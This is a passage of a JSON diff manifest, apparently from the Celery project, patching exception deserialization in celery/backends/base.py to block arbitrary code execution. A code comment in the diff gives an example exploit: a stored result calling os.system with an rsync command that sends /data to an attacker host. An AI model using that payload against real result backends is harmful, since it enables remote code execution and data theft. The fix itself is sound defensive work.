+        "path": "docs/userguide/concurrency/eventlet.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/concurrency/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/configuration.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/daemonizing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/debugging.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/extending.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/monitoring.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/optimizing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/periodic-tasks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/routing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/security.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/signals.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/sphinx.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/tasks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/testing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/workers.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/whatsnew-5.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "examples/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "examples/celery_http_gateway/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "examples/django/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "examples/eventlet/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "requirements/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "t/integration/test_backend.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_canvas.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_inspect.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_security.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_tasks.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_amqp.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_annotations.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_app.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_backends.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_beat.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_builtins.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_celery.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_control.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_defaults.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_exceptions.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_loaders.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_log.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_registry.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_routes.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_schedules.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_utils.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/apps/test_multi.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_arangodb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_asynchronous.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_azureblockblob.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_base.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_cache.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_cassandra.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_consul.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_cosmosdbsql.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_couchbase.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_couchdb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_database.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_dynamodb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_elasticsearch.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_filesystem.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_mongodb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_redis.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_rpc.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_s3.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/bin/test_multi.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_concurrency.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_eventlet.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_gevent.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_pool.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_prefork.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_solo.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/concurrency/test_thread.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/proj/contents.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "t/unit/contrib/test_abortable.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_migrate.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_pytest.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_rdb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/contrib/test_sphinx.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_cursesmon.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_events.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_snapshot.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/events/test_state.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/fixups/test_django.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_certificate.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_key.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_security.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/security/test_serialization.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_canvas.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_chord.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_context.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_result.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_states.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_tasks.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/tasks/test_trace.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/test_canvas.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_collections.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_debug.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_deprecated.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_dispatcher.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_functional.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_graph.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_imports.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_local.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_nodenames.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_objects.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_pickle.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_platforms.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_saferepr.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_serialization.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_sysinfo.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_term.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_text.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_threads.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_time.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_timer2.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/utils/test_utils.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_autoscale.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_bootsteps.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_components.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_consumer.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_control.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_heartbeat.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_loops.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_request.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_revoke.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_state.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_strategy.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/worker/test_worker.py",
+        "reason": "test_file"
+      }
+    ]
+  },
+  "files": [
+    {
+      "old_path": "celery/backends/base.py",
+      "new_path": "celery/backends/base.py",
+      "old_sha256": "3e44e36a48179f1f556e35dc8d5b2e784c258fa2885cee085d34b63507f0bc0f",
+      "new_sha256": "8398787e48203bc68a3a0c964756d5e684d23925d08406f7bc5e91008d854ce3",
+      "hunks": [
+        {
+          "old_start": 25,
+          "old_count": 7,
+          "new_start": 25,
+          "new_count": 8,
+          "changes": [
+            {
+              "operation": "replace",
+              "old_start": 28,
+              "old_count": 1,
+              "new_start": 28,
+              "new_count": 2,
+              "old_lines": [
+                28
+              ]
+            }
+          ]
+        },
+        {
+          "old_start": 338,
+          "old_count": 34,
+          "new_start": 339,
+          "new_count": 73,
+          "changes": [
+            {
+              "operation": "replace",
+              "old_start": 341,
+              "old_count": 26,
+              "new_start": 342,
+              "new_count": 3,
+              "old_lines": [
+                341,
+                342,
+                343,
+                344,
+                345,
+                346,
+                347,
+                348,
+                349,
+                350,
+                351,
+                352,
+                353,
+                354,
+                355,
+                356,
+                357,
+                358,
+                359,
+                360,
+                361,
+                362,
+                363,
+                364,
+                365,
+                366
+              ]
+            },
+            {
+              "operation": "insert",
+              "old_start": 369,
+              "old_count": 0,
+              "new_start": 347,
+              "new_count": 62,
+              "old_lines": []
+            }
+          ]
+        }
+      ],
+      "unified_diff": "--- celery/backends/base.py\n+++ celery/backends/base.py\n@@ -25,7 +25,8 @@\n from celery.app.task import Context\n from celery.exceptions import (BackendGetMetaError, BackendStoreError,\n                                ChordError, ImproperlyConfigured,\n-                               NotRegistered, TaskRevokedError, TimeoutError)\n+                               NotRegistered, SecurityError, TaskRevokedError,\n+                               TimeoutError)\n from celery.result import (GroupResult, ResultBase, ResultSet,\n                            allow_join_result, result_from_tuple)\n from celery.utils.collections import BufferMap\n@@ -338,34 +339,73 @@\n \n     def exception_to_python(self, exc):\n         \"\"\"Convert serialized exception to Python exception.\"\"\"\n-        if exc:\n-            if not isinstance(exc, BaseException):\n-                exc_module = exc.get('exc_module')\n-                if exc_module is None:\n-                    cls = create_exception_cls(\n-                        from_utf8(exc['exc_type']), __name__)\n-                else:\n-                    exc_module = from_utf8(exc_module)\n-                    exc_type = from_utf8(exc['exc_type'])\n-                    try:\n-                        # Load module and find exception class in that\n-                        cls = sys.modules[exc_module]\n-                        # The type can contain qualified name with parent classes\n-                        for name in exc_type.split('.'):\n-                            cls = getattr(cls, name)\n-                    except (KeyError, AttributeError):\n-                        cls = create_exception_cls(exc_type,\n-                                                   celery.exceptions.__name__)\n-                exc_msg = exc['exc_message']\n-                try:\n-                    if isinstance(exc_msg, (tuple, list)):\n-                        exc = cls(*exc_msg)\n-                    else:\n-                        exc = cls(exc_msg)\n-                except Exception as err:  # noqa\n-                    exc = Exception(f'{cls}({exc_msg})')\n+        if not exc:\n+            return None\n+        elif isinstance(exc, BaseException):\n             if self.serializer in EXCEPTION_ABLE_CODECS:\n                 exc = get_pickled_exception(exc)\n+            return exc\n+        elif not isinstance(exc, dict):\n+            try:\n+                exc = dict(exc)\n+            except TypeError as e:\n+                raise TypeError(f\"If the stored exception isn't an \"\n+                                f\"instance of \"\n+                                f\"BaseException, it must be a dictionary.\\n\"\n+                                f\"Instead got: {exc}\") from e\n+\n+        exc_module = exc.get('exc_module')\n+        try:\n+            exc_type = exc['exc_type']\n+        except KeyError as e:\n+            raise ValueError(\"Exception information must include\"\n+                             \"the exception type\") from e\n+        if exc_module is None:\n+            cls = create_exception_cls(\n+                exc_type, __name__)\n+        else:\n+            try:\n+                # Load module and find exception class in that\n+                cls = sys.modules[exc_module]\n+                # The type can contain qualified name with parent classes\n+                for name in exc_type.split('.'):\n+                    cls = getattr(cls, name)\n+            except (KeyError, AttributeError):\n+                cls = create_exception_cls(exc_type,\n+                                           celery.exceptions.__name__)\n+        exc_msg = exc.get('exc_message', '')\n+\n+        # If the recreated exception type isn't indeed an exception,\n+        # this is a security issue. Without the condition below, an attacker\n+        # could exploit a stored command vulnerability to execute arbitrary\n+        # python code such as:\n+        # os.system(\"rsync /data attacker@192.168.56.100:~/data\")\n+        # The attacker sets the task's result to a failure in the result\n+        # backend with the os as the module, the system function as the\n+        # exception type and the payload\n+        # rsync /data attacker@192.168.56.100:~/data\n+        # as the exception arguments like so:\n+        # {\n+        #   \"exc_module\": \"os\",\n+        #   \"exc_type\": \"system\",\n+        #   \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n+        # }\n+        if not isinstance(cls, type) or not issubclass(cls, BaseException):\n+            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'\n+            raise SecurityError(\n+                f\"Expected an exception class, got {fake_exc_type} with payload {exc_msg}\")\n+\n+        # XXX: Without verifying `cls` is actually an exception class,\n+        #      an attacker could execute arbitrary python code.\n+        #      cls could be anything, even eval().\n+        try:\n+            if isinstance(exc_msg, (tuple, list)):\n+                exc = cls(*exc_msg)\n+            else:\n+                exc = cls(exc_msg)\n+        except Exception as err:  # noqa\n+            exc = Exception(f'{cls}({exc_msg})')\n+\n         return exc\n \n     def prepare_value(self, result):\n"
+    }
+  ],
+  "renames": [],
+  "rename_ambiguities": [],
+  "skipped_changes": []
+}
